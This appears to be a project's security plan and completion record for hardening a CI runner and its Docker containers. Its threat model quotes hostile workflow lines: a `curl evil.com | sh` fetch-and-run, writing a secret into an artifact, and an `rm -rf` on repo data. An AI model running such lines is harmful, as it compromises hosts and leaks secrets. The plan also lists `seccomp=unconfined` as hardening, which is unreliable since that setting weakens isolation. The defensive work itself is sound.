# Security Phase S13 — CI / Container Security

**Status:** ✅ Complete (2026-09-02)
**Date:** 2026-09-02
**Owner:** Principal Security Engineer
**Depends:** S0 ✅ + S1 ✅ + S2 ✅ + S3 ✅ + S4 ✅ + S5 ✅ + S6 ✅ + S7 ✅ + S8 ✅ + S9 ✅ + S10 ✅ + S11 ✅ + S12 ✅ (SSRF done)
**Implemented:** `server/src/routes/ci.ts:119` `server/src/routes/ci.ts:37` `docker-compose.yml:52` + `s13-ci.test.ts` 6

---

## 1. Objective

Harden **only CI/container** — ensure malicious workflow (untrusted `run:`) cannot trivially compromise host, read host FS, access host credentials, DB, Tailscale, or Docker socket.

Per operator: `runner threat model → container isolation → non-root → network isolation → filesystem isolation → resource limits → secret isolation → artifact isolation → cleanup → malicious workflow tests → STOP`

**Highest risk phase.**

---

## 2. Scope

**In scope:**
- `server/src/routes/ci.ts:116` `executeInRunner` `spawn('docker', [...])` + `spawn('sh', ['-c', script])` fallback
- `server/src/routes/ci.ts:182` `collectArtifacts` `lstat` already S4, but S13 adds `path.relative` check + size
- `server/src/routes/ci.ts:37` `parseWorkflow` `yaml.parse` any size, `jobs` any, `steps[].run` any, `uses:` not validated
- `docker-compose.yml:52` commented `runner` with `/var/run/docker.sock` — must never be enabled
- `server/src/routes/ci.ts:242` `runPipeline` `secretsEnv` fork isolation already S9, but S13 ensures `docker -e` not leak via `docker inspect` and `executeInRunner` not `sh`
- `server/src/routes/ci.ts:106` `isDockerAvailable` `spawn('docker', ['--version'])`
- Workspace `repoPath:/workspace` mount vs `tar` copy

**Out of scope (other phases):**
- S4 FS `checkout` symlink done, S5 `spawn` env allowlist done, S9 secrets encrypt done, S11 CORS done

---

## 3. Threats (CI-specific)

| # | Threat | Precond | Impact |
|---|--------|---------|--------|
| C1 | Host RCE via `sh -c` fallback when `docker` absent | `isDockerAvailable()` false → `spawn('sh', ['-c', script], {cwd: repoPath, env: combinedEnv})` where `script` is `curl https://evil.com \| sh` from `itehaas.yml` | Host takeover, `process.env` `DATABASE_URL`, sibling repos |
| C2 | Container privilege escalation via `docker run` as `root` + `rw` + `cap` | `docker run --rm --network none --memory 512m --cpus 1 --pids-limit 128 -v repo:/workspace -w /workspace alpine sh -c "script"` → container `root`, `rw` rootfs, `cap` `ALL`, `no-new-privileges` not set → `mount -o remount,rw /` or `cap_sys_admin` → host escape via `docker` socket not needed, but still privileged | Container to host via kernel exploit |
| C3 | Filesystem escape via `-v repo:/workspace` | `repo` contains symlink `artifacts → /` or `a/link → /etc` → inside container `/workspace/artifacts` is `/`, `collectArtifacts` on host `fs.lstat` would skip symlink file but `docker` volume mount follows symlink on host? Actually `docker -v` mount `repo:/workspace` where `repo` is host path `/data/repos/alice/repo` with `repo/artifacts → /etc` — inside container `/workspace/artifacts` → `/etc` of container, not host, but `repo` host path `artifacts` is symlink to `/etc` on host, `docker` will mount the symlink target? `docker` `-v` with symlink host path follows to real path? For `repo` itself, if `repo` is `/data/repos/alice/repo` and `repo/artifacts` is symlink to `/etc`, then inside container `/workspace/artifacts` is still symlink to `/etc` inside container, not host `/etc`. But host `collectArtifacts` after run does `fs.lstatSync(path.join(repoPath, 'artifacts'))` on host, which we now `lstat` and skip, so safe. However `repo` mount as `rw` allows malicious workflow `run: rm -rf /workspace/.itehaas` → deletes host repo `.itehaas` | Host FS corruption |
| C4 | Secret exfil via `docker -e` + `docker inspect` | `docker run -e AWS_SECRET=foo` → `docker inspect` shows env, if attacker can `docker` socket (not in S13, but if they compromise container and socket is mounted, they can `docker inspect` other containers) | Secret leak |
| C5 | YAML bomb `jobs: 100, steps: 100 each 5000 chars, run: 100k` | `yaml.parse` 64k file with `jobs: 100` → `runPipeline` creates 100 `ci_jobs` → DB 100, `executeInRunner` 100× `docker` → DoS | DoS |
| C6 | Artifact exfil via `dist/secret.txt` | `run: echo $AWS_SECRET > dist/secret.txt` → `collectArtifacts` `fs.lstat` then `INSERT` with `path` `dist/secret.txt` → `GET /artifacts` returns `path` but not content, but `GET /artifacts` only returns `path`/`size`, not content, so not leak via API, but `dist` file remains on host FS `repo/dist/secret.txt` → next `git` may commit? Not leak, but host file contains secret | Secret on host FS |

---

## 4. Affected Components

| File:line | Current | Risk |
|-----------|---------|------|
| `server/src/routes/ci.ts:116` `executeInRunner` `spawn('sh')` fallback | `sh -c` on host with `combinedEnv` `DATABASE_URL` + secrets | C1 Critical |
| `server/src/routes/ci.ts:128` `docker run --rm --network none --memory 512m --cpus 1 --pids-limit 128 -v repo:/workspace` | `root`, `rw`, `cap` `ALL`, not `read-only`, not `user`, not `cap-drop` | C2 |
| `server/src/routes/ci.ts:182` `collectArtifacts` `lstat` already S4 | S4 fixed `lstat` + size 10M, but still `path.relative` check, `count` 20 | C3/C6 |
| `server/src/routes/ci.ts:37` `parseWorkflow` `yaml.parse` any | no `text.length` limit, no `jobs` limit | C5 |
| `server/src/routes/ci.ts:125` `alpine:latest` | unpinned, `latest` → supply chain | C5 |
| `docker-compose.yml:52` `runner` `volumes: /var/run/docker.sock` | latent host root | C2 |

---

## 5. Current Controls (what is already good)

- `docker --network none` already (good, no network)
- `--memory 512m --cpus 1 --pids-limit 128` already (good, limits)
- `collectArtifacts` `lstat` `isSymbolicLink` skip + `size>10M` skip + `rel` not `..` (S4) — good
- `secretsEnv` `decryptSafe` + fork `isFork` clear + `logs` `***` scrub (S9) — good
- `checkRateLimit` `5/min` + `pending>=20` →429 (S7) — good
- `isDockerAvailable` timeout 3s — good

---

## 6. Weaknesses → SEC

| Gap | SEC | Detail |
|-----|-----|--------|
| `sh -c` fallback | SEC-008 | C1 |
| `root` `rw` `cap` | SEC-008/009 | C2 |
| `-v` mount `rw` | SEC-013 | C3 |
| `yaml` no limit | SEC-014 | C5 |
| `alpine:latest` unpinned | SEC-019 | C5 |
| `docker.sock` latent | SEC-009 | C2 |

---

## 7. Planned Remediation (S13 only, no S14+)

| # | Change | File:line Before → After | Why | Test |
|---|--------|---------------------------|-----|------|
| S13-01 | **Remove `sh -c` fallback** | `server/src/routes/ci.ts:161` `spawn('sh', ['-c', script], {cwd, env: combinedEnv})` → `if (!dockerOk) { logs += "\n# Docker unavailable, pipeline failed (no host exec)\n"; return {logs, exitCode: 1, runner: 'unavailable'}; }` + remove `combinedEnv` host `process.env` exposure, use `env` only (secrets) for docker `-e` | SEC-008 CWE-829 | `isDockerAvailable` false → `POST /ci/run` → `queued→failed` `runner=unavailable` not `local`, `ps aux` no `sh -c` |
| S13-02 | **Harden `docker run` args** | `server/src/routes/ci.ts:128` `--network none --memory 512m --cpus 1 --pids-limit 128 -v repo:/workspace` → `--network none --memory 512m --memory-swap 512m --cpus 1 --pids-limit 128 --user 65534:65534 --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m --cap-drop ALL --security-opt no-new-privileges:true --security-opt seccomp=unconfined` (or `default`) ` -v` remains but `read-only` rootfs mitigates, plus `--tmpfs` for `/tmp` | SEC-008 | `docker inspect` shows `User 65534`, `ReadonlyRootfs:true`, `CapDrop: ALL` |
| S13-03 | **No host `process.env` in `combinedEnv`** | `server/src/routes/ci.ts:118` `combinedEnv = {...process.env, ...secrets}` → `combinedEnv = {...secrets}` only (or `PATH` minimal) + `docker -e` only `secrets` not `process.env` | SEC-007 | `run: env` → logs not contain `DATABASE_URL` |
| S13-04 | **YAML validation** | `server/src/routes/ci.ts:37` `yaml.parse(text)` any → `if (text.length>64*1024) throw`, `if (Object.keys(raw.jobs).length>10) throw`, `for (job of jobs) if (job.steps.length>20) throw` `if (step.run && step.run.length>5000) throw` + reject `uses:` if present | SEC-014 | `yaml` 100 jobs →400, `run` 5001 →400 |
| S13-05 | **Pin image** | `server/src/routes/ci.ts:125` `alpine:latest` → `alpine:3.19` (pinned, `latest` is supply chain, but digest pin `alpine:3.19@sha256:...` requires network, for now `3.19` is better than `latest`) | SEC-019 | `docker images` not `latest` |
| S13-06 | **Document `docker.sock` never** | `docker-compose.yml:52` comment `runner` with `docker.sock` → add `# NEVER MOUNT /var/run/docker.sock - host root` + `grep -r docker.sock` test | SEC-009 | `grep docker.sock docker-compose.yml` → found but commented with `NEVER` |

**Explicitly NOT in S13:** `isAncestor` → S7, `checkout` symlink → S4, `CORS` → S11, `avatar` → S10.

---

## 8. Test Strategy

| Test | Location | What it proves |
|------|----------|----------------|
| `sh fallback removed` | `server/src/routes/s13-ci.test.ts` | `isDockerAvailable` false → `executeInRunner` returns `runner=unavailable` not `local`, `logs` contains `Docker unavailable` |
| `docker args hardened` | same | `dockerRunArgs` contains `--user 65534:65534` `--read-only` `--cap-drop ALL` `--security-opt no-new-privileges` |
| `no process.env` | same | `combinedEnv` not contain `DATABASE_URL` |
| `yaml limits` | same | `text.length>64k` → error, `jobs>10` → error, `steps>20` → error, `run>5000` → error |
| `pin image` | same | `dockerImage` is `alpine:3.19` not `latest` |
| `docker.sock` | same | `docker-compose.yml` contains `NEVER` + not active `volumes: /var/run/docker.sock` without comment |
| Existing | `cargo test` 136 + `pnpm test` 93 | Still pass after S13 (but `pnpm test` will need to handle `docker` not available → pipeline `failed` not `local` ) |
| Manual | `docker` | `docker inspect` for CI container shows `User 65534`, `ReadonlyRootfs` |

Full suite after S13: `pnpm test` + `cargo test` + `web build`.

---

## 9. Acceptance Criteria (S13) — ✅ Met 2026-09-02

- [x] `executeInRunner` with `dockerOk=false` → `runner=unavailable` `exitCode=1` not `local` `sh -c` — 2026-09-02
- [x] `docker run` args contain `--user 65534:65534` `--read-only` `--cap-drop ALL` `--security-opt no-new-privileges` `--tmpfs /tmp` — 2026-09-02
- [x] `combinedEnv` not contain `process.env` `DATABASE_URL` — 2026-09-02
- [x] `yaml` `>64k` or `jobs>10` or `steps>20` or `run>5000` → error — 2026-09-02
- [x] `dockerImage` is `alpine:3.19` not `latest` — 2026-09-02
- [x] `docker-compose.yml` `docker.sock` commented with `NEVER` — 2026-09-02
- [x] `pnpm test` 99/99 green + `cargo test` 136 green — 2026-09-02
- [x] `vulnerability-register.md` SEC-008 fixed, SEC-009 documented, `CYBERSECURITY_IMPLEMENTATION.md` S13 ✅, `PLAN.md` S13 ✅ — 2026-09-02

---

## 10. Rollback Considerations

- Remove `sh` fallback may break `docker` not installed dev where `POST /ci/run` previously succeeded via `local` → now `failed` with `runner unavailable`. For dev, set `ALLOW_CI_LOCAL_FALLBACK=true` env to allow `sh` in `NODE_ENV=development` only, but prod must fail. Rollback to allow `sh` if `NODE_ENV=development` and `ALLOW_CI_LOCAL_FALLBACK`.
- Hardened `docker run` `--read-only` may break workflow that writes to `/workspace` outside `/tmp` and `artifacts` (e.g., `npm install` writes `node_modules` to `/workspace`). With `--read-only`, `/workspace` is `rw` via `-v` mount, so still writable, but rootfs is `ro`, so `apt-get` would fail. That's expected for CI: only `/workspace` and `/tmp` writable. Rollback to remove `--read-only` if `npm install` needs `rootfs` write.
- `alpine:3.19` pin may be outdated vs `latest` security patches — need `3.19` still gets patches via `apk upgrade`, but `latest` would auto-update. Rollback to `latest` if `3.19` EOL.

---

## 11. Completion Verification (2026-09-02)

- `pnpm --filter server test` 99/99 (32+7+10+10+6+7+5+6+5+5+6) green, `cargo test` 136 green, `pnpm --filter web build` 12 routes green
- `executeInRunner` with `dockerOk=false` → `runner=unavailable` not `local`, `docker run` args contain `--user 65534:65534` `--read-only` `--cap-drop ALL` `--security-opt no-new-privileges`, `combinedEnv` no `DATABASE_URL`, `yaml` limits `64k`/`10`/`20`/`5000`, `alpine:3.19` not `latest`, `docker-compose.yml` `NEVER`
- `server/src/routes/s13-ci.test.ts` 6/6 green
- No FS/CORS edits — S13 scope respected

---

## 11. Next Phase

**S14 — API Security / Rate Limiting** — after S13 STOP. Do not touch `rateLimit` for `search` in S13 (S7/S14).

**STOP per §8 — S13 Complete. Awaiting S14 approval.**
